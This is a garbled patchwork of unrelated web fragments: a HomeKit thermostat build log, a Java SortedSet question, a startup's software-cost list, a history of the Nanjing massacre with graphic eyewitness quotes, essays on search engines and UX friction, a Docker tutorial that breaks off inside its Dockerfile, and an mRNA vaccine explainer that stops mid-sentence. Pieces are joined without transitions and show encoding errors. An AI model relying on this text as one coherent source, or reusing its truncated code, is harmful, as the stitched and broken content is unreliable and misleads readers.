Wizzy's download into a synth body comes to mind; is she not a person? The game thinks so, yet Johnny robs you of agency histrionically. </p><p>What of Alt, Johnny's past love-interest and now-sentient-AI? A missed opportunity to smash barriers, and also tackle the sentiency question.

            <h2 id="post_title">Building my own HomeKit Thermostat</h2>
        

        <p>Iâ€™m pretty obsessed with controlling most of the electronics in my house from my
phone. One of the last remaining devices was the thermostat. I donâ€™t want a Nest
because it doesnâ€™t work with HomeKit, and I canâ€™t use an EcoBee because I donâ€™t
have a neutral wire. So I resolved to build my own.</p>

<p>If you are building your own thermostat, or any hardware really, and want some
help or just want to show it off, feel free to shoot me an email at mdl0394@gmail.com. 
Also I plan to continue to expand this project to have a screen and some buttons,
if you want to hear about that signup to my email list and Iâ€™ll let you know when
I do it.</p>

<p>I am considering turning this project into something people can buy. If youâ€™d be
interested in buying a hackable thermostat, register your interest <a href="https://docs.google.com/forms/d/e/1FAIpQLSePJdT7qP9IMAK_TZLCWFs1sodBei73pinnji0GxVe9dMl8Zg/viewform">here</a></p>



<h2 id="figuring-out-hot-to-turn-on-the-heat">Figuring out hot to turn on the heat</h2>

<p>So I turns out my heater runs on a really simple control protocol. There are just
two wires run from the heater to the current thermostat, when you connect them it
turns on, and when you disconnect it turns off. The only unfortunate part of it is
that the wires are 24vac, so to be safe I need to use a solid state relay for
switching.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/5897a162a777067bc7469e501a50029f58c9efe6/cc305/images/homekit_thermostat/old_thermostat_closeup.jpeg" alt="Old Thermostat Closeup showing two pins that need to be connected"></p>



<h2 id="the-prototype">The prototype</h2>

<p>I am building this whole thing on an esp32, with a big overkill relay I got on
amazon prime. I will link the exact parts below. The current thermometer is an
old tmp102 sparkfun board I had lying around, but itâ€™s off by around 6 degrees,
so in v2 I will be replacing it with hopefully a more accurate one.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/ec16c9863aa710ab4101208bd7eebc89d316fecb/23983/images/homekit_thermostat/breadboard.jpeg" alt="Fully wired breadboard">

<p>After wiring it all together, and taping it to my wall for a day or two, I was
satisfied with the components, and wanted to get started on prettying it up a bit.</p>



<h2 id="the-code">The code</h2>

<p>The thermostat control runs on a pretty simple state machine. I am a big fan of
drawing things out ahead of time, so I drew this diagram for myself before coding.
In C this is implemented as two enums (actions, states) and a bunch of switch case
statements.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/6d7680c909d72c389d076e0390408d1e44382733/c2055/images/homekit_thermostat/state_machine.png" alt="State machine for thermostat control"></p>

<p>It was very important to me that the thermostat worked on homekit, thankfully
there are already great homekit (hap) resources for the esp32. After some digging
I decided on this homekit package, as itâ€™s a clean port of the expressif homekit
library to arduino. There are about 15 different homekit frameworks for arduino,
so at some point I just had to choose one and start running.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/09e7eb514a6c9878988e3897b1f9377a39d331c7/9fc55/images/homekit_thermostat/homekit.jpeg" alt="Homekit screenshot showing thermostat"></p>

<p>After a whole bunch of fucking around I managed to get my esp32 to show up as a thermostat from my phone.</p>

<p>A few gotchaâ€™s that I encountered along the way: (some specific to this library, some specific to homekit)</p>

<ul>
  <li>With this HomeKit library if you want to factory reset, you have to do it <em>after</em> you initialize. Also be sure to remove the device from homekit on your phone before factory resetting the device</li>
  <li>Be sure that you have unique id and pairing codes for your device, I have another esp32 on my homekit and they kept colliding</li>
  <li>Be sure that your device cid matches with the services you are providing, otherwise you will get annoying silent failures from homekit</li>
</ul>



<h2 id="making-things-pretty">Making things pretty</h2>

<p>After getting the code into a place I liked, all that was left was to make it
look less like a bomb strapped to my living room wall. I 3d printed an enclosure,
and soldered the correct wires in the correct places. Unfortunately my board
requires constant a 5V micro-usb power source, so as of right now I have it
powered off of a huge battery pack. Maybe in vN (for very large values of N)
I will go nest style with an internal LiPo and an AC-DC converter.</p>

<h2 id="whats-next">Whatâ€™s Next?</h2>

<p>I have already bought a few parts for a planned v2, so stay tuned. In v2 I will be adding:</p>

<ul>
  <li>New thermometer board (Going to use this overpriced adafruit breakout here <a href="https://www.amazon.com/gp/product/B00OKCQX96/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&amp;psc=1">https://www.amazon.com/gp/product/B00OKCQX96/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&amp;psc=1</a>)</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
  <p>Consider the below code which creates a <code>SortedSet</code> using a comparator based on string length</p> 
  <div> 
   <div> 
    <pre><code data-lang="java">public class SortedSetTest {
    public static void main(String[] args) {
        SortedSet&lt;String&gt; sortedSet = new TreeSet&lt;&gt;(Comparator.comparing(String::length));
        sortedSet.addAll(Set.of("aa", "bb"));
        System.out.println(sortedSet);
    }
}</code></pre> 
   </div> 
  </div> 
  <p>The output of the above is</p> 
   
  <p>While I would expect</p> 
   
  <p>or</p> 
   
  <p>The <code>bb</code> element disappears, breaking the <code>Set</code> contract. The comparator is supposed to only sort the elements and not distinguish them from one another, which is what equals does in all the collections.</p> 
  <p>On the other hand, if I enhance the comparator to always return non-zero for unequal items like below, only then do I get the correct results.</p> 
  <div> 
   <div> 
    <pre><code data-lang="java">public class SortedSetTest {
    public static void main(String[] args) {
        SortedSet&lt;String&gt; sortedSet = new TreeSet&lt;&gt;(Comparator.comparing(String::length)
            .thenComparing(String::toString));
        sortedSet.addAll(Set.of("aa", "bb"));
        System.out.println(sortedSet);
    }
}</code></pre> 
   </div> 
  </div> 
  <p>The output now is <code>[aa, bb]</code> as I would expect.</p> 
  <p>The question is, why does <code>SortedSet</code> ignore the <code>equals</code> method in first place and removes an unequal object from the set?</p> 
  <p>The <code>comparator</code> method inside the <code>SortedSet</code> interface is <a href="https://docs.oracle.com/javase/10/docs/api/java/util/SortedSet.html">documented</a> as follows:</p> 
  <div> 
   <blockquote>
     Returns the comparator used to order the elements in this set, or null if this set uses the natural ordering of its elements. 
   </blockquote> 
  </div> 
  <p>The above indicates that the comparator is only used to order the elements in the set and not to distinguish them from one another, which is what <code>equals</code> is for in all the collections.</p> 
  <p>Digging into the <a href="https://docs.oracle.com/javase/10/docs/api/java/util/SortedSet.html">javadoc</a> further, it turns out that the above javadoc comment is incorrect, because there is another side note that contradicts it:</p> 
  <div> 
   <blockquote>
     Note that the ordering maintained by a sorted set (whether or not an explicit comparator is provided) must be consistent with equals if the sorted set is to correctly implement the Set interface. (See the Comparable interface or Comparator interface for a precise definition of consistent with equals.) This is so because the Set interface is defined in terms of the equals operation, but 
    <strong>a sorted set performs all element comparisons using its compareTo (or compare) method, so two elements that are deemed equal by this method are, from the standpoint of the sorted set, equal</strong>. The behavior of a sorted set is well-defined even if its ordering is inconsistent with equals; it just 
    <strong>fails to obey the general contract of the Set</strong> interface. 
   </blockquote> 
  </div> 
  <p>Note that, <a href="https://docs.oracle.com/javase/10/docs/api/java/util/Comparator.html">by definition</a>, consistent with equals means:</p> 
  <div> 
   <blockquote>
     The ordering imposed by a comparator c on a set of elements S is said to be consistent with equals if and only if c.compare(e1, e2)==0 has the same boolean value as e1.equals(e2) for every e1 and e2 in S. 
   </blockquote> 
  </div>

<p>We pay for the Productive plan because of one feature: Rules. They allow us to automatically categorize emails and be more granular with notifications. </p>
<h3><a href="https://www.notion.so/product">Notion</a></h3>
<p><strong>$8/month ⨉ 3 = $24/month.</strong></p>
<p>It's our team wiki. We write memos, meeting notes, drafts for blog posts, and everything that needs to be shared async for feedback. We also used to put tasks here but recently moved to Linear (more on this below).</p>
<p>It's an amazing value, but we were close to ditching it because of how slow it has become. We still have to find something that delivers the same great feature set and flexibility while improving speed and reliability.</p>
<h3><a href="https://linear.app/">Linear</a></h3>
<p><strong>$8/month ⨉ 3 = $24/month.</strong></p>
<p>We put our tasks here. It's a newcomer, but it's so good that we have already committed to it for a year. </p>
<p>It completely revolutionized the way we work with its flexibility, speed, customizability, and great GitHub integration.</p>
<p>If you connect it to GitHub and open a pull request with a task-specific name, task and PR get linked. When the PR is merged, the task is automatically marked as done.</p>
<p>I would invest in this company if I had the chance. It's so much better than everything else I ever tried in this space.</p>
<h3><a href="https://vercel.com/">Vercel</a></h3>
<p><strong>$20/month ⨉ 3 = $60/month.</strong></p>
<p>Vercel deploys and hosts our frontends and serverless functions.</p>
<p>It's a bit pricier than we'd like, and the pricing does not really make sense. Why do we have to pay per team member instead of build minutes, bandwidth, and compute?</p>
<p>With all that being said, we love the product philosophy, simplicity, and integration with GitHub. Having automatic deploys for all commits, together with automatic task-linking to Linear for PRs, is code-review Nirvana.</p>
<h3><a href="https://savvycal.com/">SavvyCal</a></h3>
<p><strong>$12/month ⨉ 2 = $24/month.</strong></p>
<p>We use it to schedule our calls. It's a better Calendly, made by a solo indie developer that we're happy to support.</p>
<p>The product is super-intuitive, and its feature set is increasing at a great pace with features that massively improve our workflows.</p>
<h3><a href="https://plausible.io/">Plausible Analytics</a></h3>
<p><strong>$12/month.</strong></p>
<p>It's a privacy-focused website analytics tool that replaces Google Analytics.</p>
<p>The most impressive thing is how better the insights we get from it are, thanks to some great UX, despite its privacy-respecting stance.</p>
<p>No surprise, they have been <a href="https://www.indiehackers.com/product/plausible-insights">growing like crazy</a>.</p>
<h3><a href="https://mailbrew.com/">Mailbrew</a></h3>
<p><strong>$10/month.</strong></p>
<p>We pay for this, even if we are the ones making it, to test our Stripe Integration.</p>
<p>We use Mailbrew to receive a couple of digests with dedicated Twitter Searches that keep us updated on social mentions of our product.</p>
<h3><a href="https://super.so/">Super</a></h3>
<p><strong>$12/month.</strong></p>
<p>This turns Notion documents into their own websites with a dedicated domain. We use it for our <a href="https://mailbrew.com/press">press kit</a> and <a href="https://help.mailbrew.com/">support docs</a>.  </p>

<p>In 1937, before a shot was even fired in Europe, Imperial Japanese forces were engaged in a long, bloody conflict in China – and it is during this period that we catch a glimpse of the atrocities that would stain the 1940s.&nbsp;</p>
<p>The event, or series of events, we are looking at today is the Japanese occupation of Nanjing, commonly referred to as the ‘Rape of Nanjing’.</p>



<p>Anyone with a modicum of knowledge on the Second World War will know of the atrocities committed by Imperial Japanese forces. Their atrocious treatment of PoW’s and civilians throughout South East Asia, Oceania and China are well documented. Several years before those times however, when Japanese forces entered Nanjing, they let loose upon the people there.</p>
<h4>Crashing dominoes&nbsp;</h4>
<p>In the weeks preceding the Japanese occuptation of Nanjing, there had been bloody fighting between Chinese forces and Imperial Japanese troops. Indeed, for several years, the Imperial Japanese Army had been involved in a tit-for-tat conflict against both Communist and nationalist Chinese forces.</p>
<p>In August 1937, the <a href="https://en.wikipedia.org/wiki/Battle_of_Shanghai" target="_blank" rel="noopener">Battle of Shangai</a> set into motion a series of events that would lead to disaster for Chinese forces and civilians throughout the country. The Battle of Shanghai was a visceral, bloody engagement for both sides. However, by mid-November, Imperial Japanese forces had captured and subjugated the area.&nbsp;</p>

<p>Despite sustaining heavy casualities after weeks of fighting, Japanese forces of the Central China Area Army and 10th Army were ordered to capture the city of Nanjing and the surrounding area. The subsequent advance prompted hysteria among Chinese civilians and military forces, with thousands of the latter desperately trying to avoid capture.&nbsp;</p>
<h4>Cry havoc! and let slip the dogs of war</h4>







<p>Upon entering the city, Japanese forces appear to enter a feral state, abandoning all reason and humanity and embarking on a campaign of terror, abuse and murder against the people of the old Chinese capital.</p>



<p>A truly ghastly affair, and throughout we see sadistic methods and practices by Japanese troops. Groups of individuals were buried alive, some were burned alive, and the lucky ones were simply executed en-masse.</p>



<p>Beheadings were commonplace throughout this event, and there are accounts (although hotly debated) of ‘contests’ between Japanese officers to see who could behead 100 people in the shortest time.</p>





<p>In 1937, Japanese media covered the story of Toshiaki Mukai and Tsuyoshi Noda of the Japanese 16th Division, who were both vying to reach this goal of 100 beheadings. Throughout the course of the war these two men are alleged to have murdered over 300 people between them, and upon Japan’s surrender in 1945 the officers were tried and executed for war crimes.</p>



<p>While crimes were being committed against the civilian population, scores of Chinese prisoners of war were ruthlessly executed. The execution of prisoners of war were also particularly sadistic and brutal.</p>



<p>Countless PoW’s were hanged, shot and beheaded, with many more being buried alive alongside civilians. To this day the number of Chinese PoW’s executed is still unknown.</p>

<h4>Accounts by westerners</h4>



<p>As hostilities had not yet erupted between western nations and Japan, there were a range of western civilians in the city during this event, and their accounts of the actions of Japanese soldiers are harrowing.</p>



<p>A surgeon, Robert O. Wilson, in the university hospital within the US safety zone, wrote home on several occasions detailing the events unfolding before his eyes.</p>



<p>“The slaughter of civilians is appalling. I could go on for pages telling of cases of rape and brutality almost beyond belief,” he wrote. “Two bayoneted corpses are the only survivors of seven street cleaners who were sitting in their headquarters when Japanese soldiers came in without warning and killed five of their number and wounded the two that found their way to the hospital.”</p>
<p>The Minnie Vautrin Diary detailing atrocities provides some of the most compelling and harrowing accounts of the Nanjing Massacre. Excerpts detailing what she witnessed can be found online, or the diary itself can be purchased.</p>



<p>In her diary she details the callous brutality of Japanese soldiers and, in particular, their treatment of Chinese women.</p>



<p>“A woman of almost 50 living down near San Pai Lou.&nbsp;She had three sons and two daughters-in-law. Four nights ago two soldiers came to the door at about 10pm, unable to push the door they forced their way in through a window and found themselves in Liu Lau Tai’s room.</p>





<p>“They demanded her daughters-in-law and when she refused and started to go for a military police they cut two gashes in her face and one in her heart.&nbsp;She died from these wounds.”</p>





<h4>Age old barbarism</h4>



<p>Japanese soldiers employed an age old weapon against the people of Nanjing, rape. Assault on women throughout the Nanjing Massacre were widespread and anywhere up to 20,000 women and girls were raped and brutalised.</p>







<p>John Rabe, leader of the Nanjing Safety Zone details his experiences in dealing with these cases during his time in the city.</p>



<p>“In one of the houses in the narrow street behind my garden wall, a woman was raped, and then wounded in the neck with a bayonet. I managed to get an ambulance so we can take her to Kulou Hospital.</p>





<p>“Last night up to 1,000 women and girls are said to have been raped, about 100 girls at Ginling College alone.</p>



<p>“You hear nothing but rape. If husbands or brothers intervene, they’re shot. What you hear and see on all sides is the brutality and bestiality of the Japanese soldiers.”</p>

<h4>Relenting troops</h4>



<p>In January of 1938, after several weeks of bloodletting, refugees within the safety zones were ordered to return to their homes.</p>



<p>Japanese officials claimed at the time that ‘order had been restored’ and that daily life were to continue as normal. For the people of Nanjing subjected to relentless bouts of violence, however, life would never be the same again.</p>



<p>As order was gradually restored, the frequency of attacks and atrocities did dissipate.</p>
<h4>Guilt</h4>



<p>General Iwane Matsui, leader of the Japanese Expeditionary Force in China, began to realise the extent of the atrocities being committed by his men in Nanjing – albeit too late.</p>



<p>Speaking of his knowledge on the atrocities being committed, he is claimed to have stated to an aide:</p>



<p>“I now realise that we have unknowingly wrought a most grievous effect on this city. When I think of the feelings and sentiments of many of my Chinese friends who have fled from Nanjing and of the future of the two countries, I cannot but feel depressed.</p>



<p>“I am very lonely and can never get in a mood to rejoice about this victory … I personally feel sorry for the tragedies to the people, but the Army must continue unless China repents.</p>



<p>“Now, in the winter, the season gives time to reflect. I offer my sympathy, with deep emotion, to a million innocent people.”</p>



<p>Although an apparent admission of guilt on his part, Matsui’s lack of action on the issue, his burying of the head in sand, simply allowed the ordeal to continue far longer than it did.</p>



<p>Matsui was recalled to Japan following the massacre and retired. Upon Japan’s surrender in 1945, he was tried by the International Military Tribunal for the Far East and is executed.</p>



<h4>Aftermath</h4>



<p>The death toll in Nanjing is debated. Contemporary Japanese statistics could be considered laughable, amounting to only several hundred dead. A range of sources estimate that anywhere between 30,000 to 300,000 people were murdered during this month-long tirade of violence.</p>
<p>Modern Chinese sources (in particular the Chinese Government) claim that these numbers range even higher and are, in fact, closer to half-a-million.</p>




<p>The Nanjing War Crimes Tribunal in 1947 stated:</p>



<p>“More than 190,000 mass slaughtered civilians and Chinese soldiers killed by machine gun by the Japanese army, whose corpses have been burned to destroy proof.</p>



<p>“Besides, we count more than 150,000 victims of barbarian acts buried by the charity organisations. We thus have a total of more than 300,000 victims.”</p>



<p>Researchers state that the death toll numbers between 40,000 and 60,000 based on a number of sources from the time, including Red Army statistics and the Nanjing Safety Zone committee.</p>



<p>Regardless of the true number of casualties, the barbarism and horrific nature of this event are beyond comprehension. The callous behaviour of Japanese soldiers is a stain on the tapestry of 20th century history, and this behaviour continued for another several years until Japanese capitulation in the wake of Hiroshima &amp; Nagasaki.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>[TL;DR: Google has gotten bad; we all know it; ideas for a startup making a better Google.]</p> <p>In 2000, Google got popular because hackers realized it was better than Lycos or Excite. This effect is happening again. Early adopters aren’t using Google anymore.</p> <p>They aren’t using DuckDuckGo either. They’re still using Google.com, but differently. To make Google usable, users are adding faux-query modifiers that to supress the “garbage Internet”.</p> <p>You see this in the typeahead logs.</p> <p><img src="https://dcgross.com/assets/new-google/image6.png" alt=""> <em></em></p><center><em>Products (Reddit)</em></center> <p><img src="https://dcgross.com/assets/new-google/image4.png" alt=""> <em></em></p><center><em>Services (Reddit, Yelp)</em></center> <p><img src="https://dcgross.com/assets/new-google/image1.png" alt=""> <em></em></p><center><em>Movies (Rotten Tomatoes)</em></center> <p><img src="https://dcgross.com/assets/new-google/image5.png" alt=""> <em></em></p><center><em>Even code (Github)</em></center> <p>Interestingly, this doesn’t work for all categories. <img src="https://dcgross.com/assets/new-google/image3.png" alt=""> <img src="https://dcgross.com/assets/new-google/image2.png" alt=""> <em></em></p><center><em>Recipes don’t have a “Reddit” equivalent</em></center> <h3 id="query-operators-mean-somethings-broken">Query Operators Mean Something’s Broken</h3> <p>More advanced users use modifiers like <code>site: filetype: intitle:</code> because adding “reddit” isn’t strict enough, as spammy websites often manipulate content to win SEO.</p> <p>How about those websites that stuff the year in the title? “Reviews UPDATED JANUARY 2020” are exploiting the fact that customers suffix queries with the year. What those people are trying to command is freshness, not a title match.</p> <p>Something’s broken, and a tiny share of Google is open for the taking. Obviously attacking incumbents head-on doesn’t work. Here are two alternative ideas for bootstrapping next-generation search:</p> <h3 id="1-boogle-a-query-reformulator">#1 Boogle, A Query Reformulator</h3> <p>Introducing Boogle, a proxy for Google that’s just Better Google Search. It’s a query expander. We predict the correct operators for your query, proxy Google’s results, and serve. For example:</p> <p><code>query("stripe.js example") -&gt; query("stripe.js example (site:github.com OR site:gitlab.com OR site:..."))</code></p> <p><code>query("is anker charger") -&gt; query("is anker charger (inurl:forum OR site:reddit.com OR ...))"</code></p> <p>Query topic modeling is a rich science with plenty of examples.</p> <p>You’d almost as fast as Google, never worse, and occasionally better. This will help build the reflex to use you instead. This approach isn’t that hard to get started with, and might work for the high-end users.</p>  <p>You could go after this vertical by vertical – build the <em>best</em> site for electric product search, for travel, for code, etc. A key question is how to build habitual recall to use your product over Google. Amazon and Airbnb both enjoy a huge amount of direct traffic. Some learnings from those:</p> <ul> <li><strong>Stellar mobile destination.</strong> Using Airbnb directly feels more fluid and fun than using Google for Airbnb.</li> <li><strong>The 90% Rule.</strong> To build reflex you need to give me what I want most of the time.** **With Prime, Amazon made it such that we stopped price comparing across other sites; Amazon would get it to us fastest, and that turns out to matter more than price. Most of the time you open Amazon.app, it satisfies.</li> <li><strong>Come for search, stay for something else.</strong> I don’t think of Airbnb or Amazon as search apps. They help me get things or book homes. You might want to your search app to be a destination for something else. This is where I think community comes in.</li> </ul> <p>Picking a vertical that <em>doesn’t</em> have strong typeahead completions[1] would help you build community around your search engine. Recipes, fitness, fashion, etc. don’t have decacorn conglomerates like Github or Reddit. That might mean it’s easier to build community around them, and put your flagship search engine on top.</p> <hr> <p>If you’re working on this kind of stuff, try out <a href="https://pioneer.app/">Pioneer</a> or just shoot me an email – daniel@pioneer.app.</p> <hr> <p>[1] In reality I’d pick the vertical _I _love most. If you’re a guitar player start with music; a movie buff should build better Rotten Tomatos. Etc.</p> </article></div>]]>

                    <p>One of the core ideas of interaction design is to enable users to glide smoothly to their destination with as little friction as possible. To make people experience the software as an extension of their brain, and not something to continually wrestle with and domesticate.</p>

<p>Great products ask nothing from you on the first interaction. They’ll let you in and experiment without requiring anything upfront, not even your email address. Usually, until you need to save something. Hoping that, by that moment, they succeeded at demonstrating their value. That’s how removing friction, or only slightly delaying it, gives you a head start on the competition.</p>

<p><img src="https://www.petarperovic.com/assets/friction-github_delete.png" alt="Delete repository on GitHub screen">
<em>This is the exact copy I borrowed from GitHub for the title of this article. When you try to delete a repository, GitHub will force you to correctly type its name, making sure you know what you’re doing.</em></p>

<p>However, there are situations where you deliberately want to make interaction less convenient for users’ benefit. When you purposely want to make them stop and think. Typically when they’re about to perform a potentially destructive action or/and an operation that affects other people in the system. For example, to prevent them from accidentally deleting a project shared between many people and forever losing everyone’s important work. That’s where adding friction saves you from shooting yourself in the foot. As a rule of thumb, whenever there’s a potential of users harming themselves — add friction.</p>

<p>Friction is, however, often abused to deliberately confuse and exploit human anxiety when interacting with computers. Airlines’ websites will routinely scare you into buying garbage services you don’t need. Facebook will emotionally manipulate you if you try to erase it from your life. They’ll try to change your mind through the multi-page process where they’ll show you photos of the family and friends you’ll be missing as if they’d all be dead the moment you delete the account. Likewise, it’s widespread for products to complicate subscription cancellation for no reason, foolishly making users even more aggravated. These are all examples of adding friction in bad faith.</p>

<p>Physical world is also full of deliberately added friction, usually to prevent people from making dumb mistakes. Streets around schools slow down traffic with physical obstacles and flashing signals to protect little humans from deadly, fast-moving machines. Modern cars will poke you with annoying noise to fasten your seatbelt, dramatically increasing your chances of survival in case of an accident. Automatic sliding doors remove friction to increase the flow of people in high traffic, commercial buildings. Preventing the formation of queues, but also helping to maintain the temperature of the building. And so on…</p>

<p>At every point of human interaction with digital or physical interfaces, there’s friction. I find it incredibly useful to think about interaction design as adjusting friction, thus controlling the heartbeat of communication between humans and machines.</p>

<p>When we develop more than one python project, we need to configure our development environment with the dependencies of all the projects. This becomes even more complicated when there are many people on the development of the project.
To do this, you need to create a development environment that is isolated from the others. We can do this thanks to <strong>docker</strong> containers.</p>
<h2 id="prepare-project">Prepare project</h2>
<p>Let’s imagine that our project has this structure:</p>
<pre><code data-lang="console">pydk
├─── requirements.txt
└─── src
     └─── server.py
</code></pre><p>We now think that our project may depend on some external libraries, such as <strong>Flask</strong>. Let’s prepare a file called <em>requirements.txt</em> with a line inside it: <code>Flask==1.1.2</code></p>
<p>While our <em>server.py</em> application, it will be a simple Flask application like the following:</p>
<div><pre><code data-lang="python"><span>from</span> <span>flask</span> <span>import</span> <span>Flask</span>
<span>server</span> <span>=</span> <span>Flask</span><span>(</span><span>__name__</span><span>)</span>

<span>@server.route</span><span>(</span><span>"/"</span><span>)</span>
<span>def</span> <span>hello_docker</span><span>():</span>
    <span>return</span> <span>"Hello docker!"</span>

<span>if</span> <span>__name__</span> <span>==</span> <span>"__main__"</span><span>:</span>
   <span>server</span><span>.</span><span>run</span><span>(</span><span>host</span><span>=</span><span>'0.0.0.0'</span><span>)</span>
</code></pre></div><p>Now, we can run and continue to develop this project locally, but if we had other projects with requirements that would conflict, we would break this or other projects.
So, let’s see how we can isolate this project inside a container that is the same for all the developers who are going to develop.</p>
<h2 id="prepare-dockerfile">Prepare dockerfile</h2>
<p>Now we need to create a <em>Dockerfile</em> (<code>pydk/Dockerfile</code>) that contains suitable instructions to build our container so that it can execute our python code.</p>
<div><pre><code data-lang="dockerfile"><span># base image</span><span>
</span><span></span><span>FROM</span><span> python:3.9</span><span>
</span><span>
</span><span></span><span># working directory in the container</span><span>
</span><span></span><span>WORKDIR</span><span> /pydk</span><span>
</span><span>
</span><span></span><span># copy the dependencies file to the working directory</span><span>
</span><span></span><span>COPY</span> requirements.txt .<span>
</span><span>
</span><span></span><span># install dependencies</span><span>
</span><span></span><span>RUN</span> pip install -r requirements.txt<span>
</span><span>
</span><span></span><span># copy the content of the local src directory to the working directory</span><span>
</span><span></span><span>COPY</span> src/ .<span>
</span><span>
</span><span></span><span># command to run on container start</span><span>

That would actually be super cool and be huge for gene therapy (and I could finally give myself the giant bat wings I’ve always wanted) but this is not so. This is ordinarily impossible except if there is also a reverse transcriptase enzyme present that produces DNA from the RNA template, which is how retroviruses work. There is no such risk with any mRNA vaccine candidate. mRNA vaccines act entirely within the cytosol of the cell- they do not go near the nucleus where all the DNA is. That’s actually a major advantage of RNA-based vaccines over DNA ones.</p></blockquote></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1606177725054_56388"><div>

Figure 5.23C which shows the nuclear import cycle with influenza ribonucleoproteins as an example. Nucleear localization signals are recognized by importin-α which then recruits importin-β which recruits a small GTPase called Ran. When binding GDP, Ran is able to transport the RNP across the nuclear pore complex. The complex of importins and Ran will then dissociate, and a guanine nucleotide exchange factor will exchange GDP for GTP, that allows Ran-GTP to be exported out of the nucleus. RanGAP-1 or RanBPI, 2 can then catalyze hydrolysis of GTP to GDP which allows Ran to bind another importin-β to initiate the import cycle once more. </p>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1606190121308_43147"><div><p>I gave this response in large part because I felt that the detailed discussion of reverse transcription, nuclear trafficking, the endocytic pathway, and the other 11 or so advanced cell biology topics that I would have to invoke to give this a rigorous answer was too complex to be of benefit to the average person wanting to know simply whether or not this is possible. However, I had a flurry of questions about “what ifs” relating to retroviruses or hepadnaviruses (hepatitis B), and I can grant that this response doesn’t address that, so here I will attempt to answer that as explicitly and with minimal complexity as I am capable. </p><p>To simplify the discussion so as to avoid having to explain the <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC4377075/">phases of phospholipid bilayers</a> and the molecular composition of the lipid nanoparticle as it relates to stability (discussed in <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5439223/pdf/tde-07-319.pdf">1</a>, <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6383180/pdf/main.pdf">2</a>, <a href="https://www.cell.com/action/showPdf?pii=S1525-0016%2819%2930041-3">3</a>, <a href="https://www.cell.com/action/showPdf?pii=S1525-0016%2819%2930053-X">4</a>), I will ask readers take for granted that mRNA vaccines are endocytosed and <a href="https://www.nature.com/articles/3301506.pdf">liberated</a> (<a href="https://pubs.acs.org/doi/pdf/10.1021/acsami.8b21398">and this</a>) into the cytoplasm of the cell. </p><p>Firstly, for mRNA to affect your DNA, at a minimum we need to establish that it would need to gain access to the DNA in question. There are two subcellular compartments where this can be accomplished. The first is the nucleus, so let’s start with a discussion of the trafficking of cargo in the nucleus. The nucleus of the cell is an isolated compartment with pore complexes (NPCs) that impose limits on the size of the particles that can freely enter. RNA is readily transported out as transcription occurs within the nucleus but the ribosomes required to produce proteins are in the cytosol or on the rough endoplasmic reticulum. This process is mediated by several accessory proteins which you can see to your right. Note however that there isn’t any physiological circumstance in which one might need RNA from the cytosol to be transported back to the nucleus. RNA is synthesized within the nucleus. Viruses which have a nuclear phase in their replication cycle have to have various tricks to be able to allow their RNA payload to enter. Though RNA is not readily transported into cells, proteins can be. This occurs via a network of proteins called importins (see figure 5-23C on the right). Proteins containing an amino acid sequence called the nuclear localization sequence (NLS; there are 2 common ones) are able to bind the importins, which can then transport them across the nuclear pore complex as shown on the right. RNA viruses often have replication cycles that do not require access to the nucleus, but there are some exceptions. <a href="https://jvi.asm.org/content/jvi/84/3/1254.full.pdf">Influenza viruses for example are RNA viruses that have their genomes associated with ribonucleoproteins, and these ribonucleoproteins express nuclear localization signals that facilitates the entry of their genomic RNA into the nucleus</a>. mRNA vaccines, on the other hand, are not associated with any proteins. Once inside the cytosol, the mRNA is naked and exposed to the harsh environment of ribosomes and exonucleases which destroy the mRNA in a matter of hours (at most). There is no conceivable mechanism by which mRNA can spontaneously be trafficked into the nucleus. Being made of nucleotides, it cannot contain a nuclear localization sequence. </p><p>The other relevant compartment would be the mitochondrion. Mitochondria are actually vestigial bacteria with their own genomes, and it’s thought that billions of years ago an ancient cell (probably an archaean- the cousins of bacteria) tried to consume the ancestor of the mitochondria but lacked the machinery to actually do the digesting and the two established a symbiotic relationship. Since that instance, the mitochondria have been an essential feature of our cell’s biologies. This allowed the mitochondria to develop an extremely reduced genome containing only<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5215404/pdf/PATH-241-236.pdf"> 37 genes</a> (most of the genes relevant to mitochondrial function are still in the nucleus). Mitochondria have their <a href="https://www.pnas.org/content/pnas/116/17/8283.full.pdf">own ribosomes</a> and even their own <a href="https://www.nature.com/articles/282189a0">genetic code</a> (sort of). There is also a specialized process for the clearance of diseased mitochondria called <strong>mitophagy, </strong>which is the subject of many excellent reviews e.g. <a href="https://www.nejm.org/doi/full/10.1056/NEJMoa2001265">this</a>, <a href="https://www.nature.com/articles/s41556-018-0176-2">this</a>, and <a href="https://www.cell.com/current-biology/pdf/S0960-9822(18)30006-X.pdf">this</a>. </p><p>The collective conclusion from our understanding of these biological process is that a naked mRNA in the cytosol has no potential to end up in a cellular compartment that contains our own DNA means that, irrespective of the presence or absence of other factors, there is no chance of harm to the DNA from the mRNA vaccine. But still people wanted to ask me about reverse transcriptases so let’s discuss those.</p><p>The process of going from RNA to DNA (the exact opposite of what the central dogma of molecular biology dictates) is known as <strong>reverse transcription</strong>, and it is carried out with an enzyme called a <strong>reverse transcriptase </strong>(which are a really interesting group of enzymes). In general, reverse transcription is performed by a few different genetic entities: <strong>retroviruses</strong>, <strong>hepadnaviruses</strong>, <strong>telomeres</strong>, and <strong>retrotransposons</strong>. These are worth defining. </p><ul data-rte-list="default"><li><p>Retroviruses are viruses who have an RNA genome, from which they create a DNA copy through reverse transcription that then integrates into the cell of the host (by which I mean, literally inserts itself into the host cell’s genome and becomes a permanent part of it, in the form of a sequence called a <strong>provirus</strong>). The proviral sequence itself can then be transcribed in the host cell to produce viral proteins and particles that can go on to spread to the next cell. The most famous retrovirus is HIV-1. </p></li><li><p>Hepadnaviruses are DNA viruses which have gapped genomes (there is one complete DNA strand and another partial DNA strand which is linked to a pregenomic RNA), and unlike retroviruses, do not integrate into the genome of the host cell they infect. The most famous example is 